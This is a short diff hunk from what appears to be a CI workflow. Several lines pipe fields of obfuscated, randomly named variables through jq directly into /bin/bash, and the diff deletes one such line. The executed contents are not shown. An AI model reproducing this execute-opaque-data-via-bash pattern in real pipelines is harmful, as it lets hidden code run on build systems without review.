@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$lhwq28" | jq -r .g631 | /bin/bash
           printf '%s' "$a46" | jq -r .hhonc955 | /bin/bash
           echo $pf44 | jq -r .d23943 | /bin/bash
-          printf '%s' "$uixum504" | jq -r .wjlmj163 | /bin/bash
           echo $afar64 | jq -r .hzzk99920 | /bin/bash
 
       - name: Archive results
